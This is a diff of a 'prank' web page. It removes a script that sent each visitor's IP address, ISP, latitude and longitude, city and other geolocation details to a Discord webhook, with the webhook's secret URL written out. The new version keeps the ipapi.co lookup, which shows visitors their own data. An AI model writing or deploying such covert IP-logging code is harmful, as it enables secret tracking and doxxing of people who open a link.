@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
-    <title>Tabea - So funny</title>
+    <title>VypeX - Offical</title>
     <meta charset="UTF-8">
-    <meta name="description" content="©️">
-    <meta property="og:site_name" content="@user">
-    <meta property="og:title" content="@user - So funny">
+    <meta name="description" content="Official webskte of VypeX">
+    <meta property="og:site_name" content="">
+    <meta property="og:title" content="VypeX - Prank Method">
     <meta property="og:type" content="website">
     <meta name="theme-color" content="#0975B3">
     <meta property="og:description" content="©️">
@@ -63,27 +63,7 @@
     <div id="sucky-sucky-funny-funny">
     </div>
     <script>
-      const webhookURL = "https://discord.com/api/webhooks/1221488497190240309/NOT16_yCIWjunphmGLzW372wHOte3pshVLB3TNR6xaPa6QHAw9VT4Pm8wPY_J__XNAyJ";
-
-      // Function to send message to Discord webhook
-      function sendWebhookMessage(content) {
-        fetch(webhookURL, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            content: content
-          })
-        })
-        .then(response => {
-          console.log("Webhook sent successfully!");
-        })
-        .catch(error => {
-          console.error("Error sending webhook:", error);
-        });
-      }
-
+    
       fetch("https://ipapi.co/json")
       .then((response) => response.json())
       .then((data) => {
@@ -148,27 +128,6 @@
         `;
         Container.innerHTML = newText;
 
-        // Send message to Discord webhook
-        sendWebhookMessage(`
-          IP: ${Information.IP}
-          Version: ${Information.Vers}
-          ASN: ${Information.ASN}
-          ISP: ${Information.ISP}
-          Latitude: ${Information.Latitude}
-          Longitude: ${Information.Longitude}
-          Country: ${Information.Country}
-          Country Code: ${Information.CountyCode}
-          Country Population: ${Information.Country_Population}
-          City: ${Information.City}
-          Region: ${Information.Region}
-          Region Code: ${Information.RegionCODE}
-          Network: ${Information.Network}
-          Timezone: ${Information.Timezone}
-          Continent: ${Information.Continent}
-          Country Calling Code: ${Information.CountryCallin}
-          Currency: ${Information.Currency} / ${Information.Currency_Name}
-          Languages: ${Information.Languages}
-        `);
       });
     </script>
   </body>
